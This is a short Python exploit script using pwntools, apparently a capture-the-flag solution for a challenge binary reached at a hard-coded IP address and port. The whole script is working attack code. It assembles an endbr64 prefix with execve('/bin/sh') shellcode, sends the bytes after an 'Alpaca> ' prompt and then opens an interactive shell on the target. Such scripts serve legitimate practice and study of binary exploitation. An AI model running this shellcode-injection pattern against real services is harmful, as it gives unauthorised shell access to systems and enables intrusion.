from pwn import *

HOST = "34.170.146.252"
PORT = 36037

io = remote(HOST, PORT)
elf = context.binary = ELF("../distfiles/chal")

endbr64 = asm("endbr64")
sc = asm(shellcraft.execve("/bin/sh", 0, 0))
payload = endbr64 + sc
print(payload)
io.sendlineafter(b"Alpaca> ", payload)
io.interactive()